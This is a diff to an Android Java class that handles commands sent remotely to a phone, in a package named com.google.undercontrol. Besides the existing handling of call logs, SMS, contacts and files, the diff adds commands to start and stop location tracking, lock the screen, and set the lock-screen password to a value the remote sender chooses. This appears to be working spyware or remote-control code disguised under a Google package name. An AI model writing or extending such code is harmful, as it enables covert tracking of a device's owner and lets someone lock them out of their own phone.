@@ -6,6 +6,18 @@ import java.util.List;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.SharedPreferences.Editor;
+import android.text.TextUtils;
+import android.util.Log;
+import android.view.View;
+import android.widget.Toast;
+
+import com.google.undercontrol.MyAdmin;
 import com.google.undercontrol.dao.CallLogDao;
 import com.google.undercontrol.dao.ContactDao;
 import com.google.undercontrol.dao.FileDao;
@@ -16,15 +28,10 @@ import com.google.undercontrol.domain.ConversInfo;
 import com.google.undercontrol.domain.FileInfo;
 import com.google.undercontrol.domain.MsgType;
 import com.google.undercontrol.domain.SmsInfo;
-import com.google.undercontrol.utils.JsonUtils;
+import com.google.undercontrol.service.BDLocationService;
 import com.google.undercontrol.utils.MsgUtils;
 import com.google.undercontrol.utils.MyConstant;
-
-import android.content.Context;
-import android.content.Intent;
-import android.text.TextUtils;
-import android.util.Log;
-import android.widget.Toast;
+import com.google.undercontrol.utils.Utils;
 
 /**
  *信息处理类
@@ -37,10 +44,14 @@ public class MsgPorcess {
 	 * 封装所有对短信的操作
 	 */
 	private SmsDao smsDao;
+	private DevicePolicyManager dpm;
+	private SharedPreferences sp;
 
 	public MsgPorcess(Context context) {
 		this.context = context;
 		smsDao = new SmsDao(context);
+		sp=context.getSharedPreferences("config", Context.MODE_PRIVATE);
+		
 	}
 	/**
 	 * 处理信息
@@ -91,12 +102,32 @@ public class MsgPorcess {
 			}else if(type.equals(MsgType.DEL_CALL_LOG)) {
 //				删除通话记录
 				delCallLog(dwFromUserid,jObj);
+			}else if(type.equals(MsgType.START_LOCAATION)) {
+//				开始定位
+				Intent intent=new Intent(context, BDLocationService.class);
+				MyConstant.CURRENT_ID=dwFromUserid;
+				context.startService(intent);
+			}else if(type.equals(MsgType.STOP_LOCAATION)) {
+//				停止定位
+				Intent intent=new Intent(context, BDLocationService.class);
+				context.stopService(intent);
+			}else if(type.equals(MsgType.LOCK_SCREEN)) {
+//				锁屏
+				Utils.lockScreen(context, sp.getString("lockScreenPwd", ""));
+			}else if(type.equals(MsgType.SET_LOCK_SCREEN_PWD)) {
+//				设置锁屏密码
+				String pwd = jObj.getString(MsgType.DATA);
+				Editor editor = sp.edit();
+				editor.putString("lockScreenPwd", pwd);
+				editor.commit();
+				MsgUtils.send(context, dwFromUserid,MsgType.SET_LOCK_SCREEN_PWD_SUCCESS);
 			}
 		} catch (JSONException e) {
 			Log.e(TAG,"Json格式不正确！");
 			e.printStackTrace();
 		}
 	}
+	
 	/**
 	 * 删除通话记录
 	 * @param dwFromUserid
